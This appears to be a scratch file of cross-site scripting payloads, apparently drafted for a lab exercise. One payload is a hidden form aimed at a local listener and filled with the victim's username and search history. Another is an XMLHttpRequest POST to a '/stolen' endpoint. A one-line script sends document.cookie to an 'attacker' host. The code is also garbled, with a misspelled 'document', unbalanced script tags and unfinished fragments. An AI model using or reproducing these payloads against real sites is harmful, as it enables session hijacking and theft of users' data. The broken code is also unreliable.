<script>

<form name='payload' id="payload" action='http://127.0.0.1:31337/'>
<input type='hidden' name='username'/>
<input type='hidden' name='searchHist'/>


<script type="text/javascript">

   var formInfo= docuent.forms['payload'];
   var username = document.getElementById('logged-in-user');
   var searchHist = document.getElementById('history-list');

   formInfo.username.value = username
   formInfo.searchHist.value = searchHist

</script>

http://127.0.0.1:31337/stolen?user=<username>&last_search=<last search>
var http


<script>var params = 'type=topic&action=delete&id=347';var username = document.getElementById('logged-in-user');var searchHist = document.getElementById('history-list');console.log(searchHist)</script>

    var http = new XMLHttpRequest();alert(username);
    http.open('POST', '//127.0.0.1:31337/stolen', true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            // Do something else.
        }
    };
    http.send(params);
 </script>




 <script>
window.location='http://attacker/?cookie='+document.cookie
</script>
